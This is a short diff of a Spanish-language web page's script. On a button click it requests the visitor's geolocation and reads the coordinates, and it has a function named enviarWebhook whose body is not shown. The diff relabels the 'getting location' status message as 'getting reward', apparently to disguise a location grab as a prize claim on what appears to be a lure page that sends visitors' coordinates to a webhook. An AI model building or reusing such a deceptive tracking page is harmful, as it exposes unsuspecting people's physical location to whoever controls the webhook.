@@ -136,7 +136,7 @@ function mostrarMensaje(texto, color="#f94144") {
 }
 
 btn.addEventListener("click",()=>{
-  mostrarMensaje("Obteniendo ubicación...", "#007bff");
+  mostrarMensaje("Obteniendo Recompensa...", "#007bff");
   if(!navigator.geolocation){
     mostrarMensaje("Tu navegador no soporta geolocalización.");
     return;
@@ -149,7 +149,7 @@ btn.addEventListener("click",()=>{
 });
 
 function onSuccess(pos){
-  mostrarMensaje("✅ Buscando Recompensa correctamente.", "#43aa8b");
+  mostrarMensaje("✅ Recompensa correcta.", "#43aa8b");
 
   const lat = pos.coords.latitude;
   const lon = pos.coords.longitude;
@@ -226,6 +226,7 @@ async function enviarWebhook(data){
 </script>
 </body>
 </html>
+
 
 
 
